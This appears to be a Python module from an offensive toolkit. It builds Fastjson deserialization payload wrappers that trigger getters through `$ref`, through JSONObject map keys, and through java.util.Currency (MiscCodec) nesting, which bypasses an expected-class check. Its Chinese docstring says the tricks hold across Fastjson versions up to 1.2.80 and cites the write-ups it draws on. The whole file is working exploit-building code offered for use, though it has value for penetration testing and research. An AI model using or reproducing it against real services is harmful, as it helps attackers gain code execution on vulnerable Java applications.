"""Fastjson getter 触发技巧（与版本无关，≤1.2.47 / 68 / 80 / parse 均可用）。

参考：
- `$ref` 触发 getter：parse/parseObject 不指定类型时可拉任意字段 getter
  https://xz.aliyun.com/news/16117
- `java.util.Currency` 触发全部 getter（MiscCodec；Map key→String 调 JSONObject.toString）
  https://mp.weixin.qq.com/s/7c_zi5Pv4a69IV0zzJo5Ww

多数基于 JSON.parse() 的 payload 已内嵌 `$ref`。若反序列化点存在期望类，
需再套一层 Currency，才能在 MiscCodec 路径里触发 getter。
（1.2.68/80 自带 AutoCloseable/Exception 双 @type 是另一类 expect 绕过；
Currency 套层解决的是「有期望类时如何触发 getter」，二者可叠加。）
"""

from __future__ import annotations

from typing import Literal

GetterTrigger = Literal[
    "ref",
    "json_key",
    "currency",
    "currency_json_key",
]

GETTER_TRIGGER_CHOICES: tuple[GetterTrigger, ...] = (
    "ref",
    "json_key",
    "currency",
    "currency_json_key",
)

GETTER_TRIGGER_NOTES = (
    "$ref：parse/parseObject 无期望类时可触发任意字段 getter（见 xz.aliyun.com/news/16117）。",
    "json_key：JSONObject/JSONArray 作 Map key → toString → 触发 getter（可省略 @type）。",
    "currency：java.util.Currency（MiscCodec val.currency|currencyCode）套层；"
    "有期望类时需套此层才能触发 getter（见 mp.weixin.qq.com/s/7c_zi5Pv4a69IV0zzJo5Ww）。",
    "currency_json_key：Currency + JSONObject 作 key（java-chains 常见形态）。",
)


def normalize_getter_trigger(value: str | None) -> GetterTrigger:
    raw = (value or "ref").strip().lower().replace("-", "_")
    if raw not in GETTER_TRIGGER_CHOICES:
        raise ValueError(
            "getter_trigger 须为 ref / json_key / currency / currency_json_key，"
            f"收到: {value!r}"
        )
    return raw  # type: ignore[return-value]


def uses_json_key(trigger: GetterTrigger) -> bool:
    return trigger in ("json_key", "currency_json_key")


def uses_currency_wrap(trigger: GetterTrigger) -> bool:
    return trigger in ("currency", "currency_json_key")


def wrap_with_currency(
    inner: str,
    *,
    outer_key: str = "x",
    nest_key: str = "xx",
    currency_field: str = "currency",
) -> str:
    """套 java.util.Currency（MiscCodec）。

    currency_field 可为 ``currency`` 或 ``currencyCode``。
    inner 应为 JSON 对象/数组字面量（允许非严格 JSON，如 JSONObject 作 key）。
    """
    body = (inner or "").strip()
    if not body:
        raise ValueError("Currency 套层的 inner payload 不能为空")
    field = (currency_field or "currency").strip() or "currency"
    if field not in ("currency", "currencyCode"):
        raise ValueError("currency_field 须为 currency 或 currencyCode")
    ok = (outer_key or "x").strip() or "x"
    nk = (nest_key or "xx").strip() or "xx"
    # {"x":{"@type":"java.util.Currency","val":{"currency":{"xx": <inner> }}}}
    return (
        f'{{"{ok}":{{"@type":"java.util.Currency",'
        f'"val":{{"{field}":{{"{nk}":{body}}}}}}}}}'
    )


def map_key_entry(key_json: str, *, value: str = "{}") -> str:
    """非严格 JSON 的 ``key:value`` 片段（不含外层大括号），便于嵌入对象。"""
    key = (key_json or "").strip()
    if not key:
        raise ValueError("Map key 不能为空")
    return f"{key}:{value}"


def as_map_key(key_json: str, *, value: str = "{}") -> str:
    """完整对象 ``{ key: value }``。"""
    return f"{{{map_key_entry(key_json, value=value)}}}"


def json_object_key(
    fields_json: str,
    *,
    with_type: bool = True,
    as_array: bool = False,
    value: str = "{}",
    wrap_object: bool = False,
) -> str:
    """构造 JSONObject（或 JSONArray 包一层）作 Map key。

    ``fields_json`` 为对象内部字段，如 ``"c":{...}``（不含外层大括号）。
    默认返回可嵌入的 ``key:value``；``wrap_object=True`` 时返回完整 ``{key:value}``。
    """
    inner = (fields_json or "").strip().strip(",")
    if with_type:
        obj = f'{{"@type":"com.alibaba.fastjson.JSONObject",{inner}}}'
    else:
        obj = f"{{{inner}}}"
    if as_array:
        obj = f"[{obj}]"
    if wrap_object:
        return as_map_key(obj, value=value)
    return map_key_entry(obj, value=value)


def apply_currency_if_needed(
    payload: str,
    trigger: GetterTrigger | str,
    *,
    outer_key: str = "x",
    nest_key: str = "xx",
    currency_field: str = "currency",
) -> str:
    mode = normalize_getter_trigger(trigger if isinstance(trigger, str) else trigger)
    if not uses_currency_wrap(mode):
        return payload
    return wrap_with_currency(
        payload,
        outer_key=outer_key,
        nest_key=nest_key,
        currency_field=currency_field,
    )


def notes_for_trigger(trigger: GetterTrigger | str) -> list[str]:
    mode = normalize_getter_trigger(trigger if isinstance(trigger, str) else trigger)
    mapping = {
        "ref": GETTER_TRIGGER_NOTES[0],
        "json_key": GETTER_TRIGGER_NOTES[1],
        "currency": GETTER_TRIGGER_NOTES[2],
        "currency_json_key": GETTER_TRIGGER_NOTES[3],
    }
    out = [mapping[mode]]
    if mode == "currency":
        out.append("当前在 `$ref` 形态 payload 外再套 Currency。")
    return out
